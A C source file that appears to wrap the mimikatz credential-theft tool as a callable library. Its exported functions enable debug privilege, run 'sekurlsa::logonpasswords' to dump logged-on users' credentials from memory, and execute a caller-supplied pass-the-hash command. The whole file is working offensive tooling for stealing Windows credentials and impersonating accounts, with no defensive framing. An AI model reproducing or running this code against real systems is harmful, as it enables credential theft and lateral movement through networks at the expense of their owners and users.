#include "mimikatz.h"
#include "windows.h"
#include "strsafe.h"
#include "ai_log.h"
#include "ai_interface.h"

//==============================================================================
AI_LOGON_DATA_CONTAINER_TYPE *gLogonDataContainer;

AI_LOGON_DATA_TYPE* GetCurrentLogonDataEntry() {
  if (gLogonDataContainer && gLogonDataContainer->OutputEntryCount < gLogonDataContainer->InputEntryCount)
    return &gLogonDataContainer->LogonDataEntry[gLogonDataContainer->OutputEntryCount];
  else
    return 0;
}

AI_USER_DATA_TYPE* GetCurrentUserDataEntry() {
  AI_LOGON_DATA_TYPE *logonEntry = GetCurrentLogonDataEntry();
  if (logonEntry && logonEntry->OutputUserCount < MAX_USER_DATA_COUNT)
    return &logonEntry->UserData[logonEntry->OutputUserCount];
  else
    return 0;
}

BOOL AiGetLogonData(AI_LOGON_DATA_TYPE *logonData, DWORD inputEntryCount, DWORD *outputEntryCount) {
  NTSTATUS status = 0;

  AI_LOGON_DATA_CONTAINER_TYPE logonDataContainer = {0};
  logonDataContainer.LogonDataEntry  = logonData;
  logonDataContainer.InputEntryCount = inputEntryCount;

  gLogonDataContainer = &logonDataContainer;

  mimikatz_initOrClean(TRUE);
  status = mimikatz_dispatchCommand(L"privilege::debug");
  if (status != 0) {
    DebugPrint("Error: privilege::debug failed with status %x\n", status);
    goto EXIT_OUT;
  }

  status = mimikatz_dispatchCommand(L"sekurlsa::logonpasswords");
  if (status != 0) {
    DebugPrint("Error: sekurlsa::msv failed with status %x\n", status);
    goto EXIT_OUT;
  }

  *outputEntryCount = gLogonDataContainer->OutputEntryCount;

EXIT_OUT:
  mimikatz_initOrClean(FALSE);

  gLogonDataContainer = 0;
  return status == 0;
}

//==============================================================================
MIMIKATZ_API BOOL AiPassTheHash(const wchar_t *pthCommadLine) {
  NTSTATUS status = 0;

  mimikatz_initOrClean(TRUE);
  status = mimikatz_dispatchCommand(L"privilege::debug");
  if (status != 0) {
    DebugPrint("Error: privilege::debug failed with status %x\n", status);
    goto EXIT_OUT;
  }

  status = mimikatz_dispatchCommand((wchar_t *)pthCommadLine);
  if (status != 0) {
    DebugPrint("Error: sekurlsa::pth failed with status %x\n", status);
    goto EXIT_OUT;
  }

EXIT_OUT:
  mimikatz_initOrClean(FALSE);

  gLogonDataContainer = 0;
  return status == 0;
}

//==============================================================================
BOOL gEnableLogging = TRUE;

MIMIKATZ_API VOID AiEnableLogging(BOOL enable) {
  gEnableLogging = enable;
}

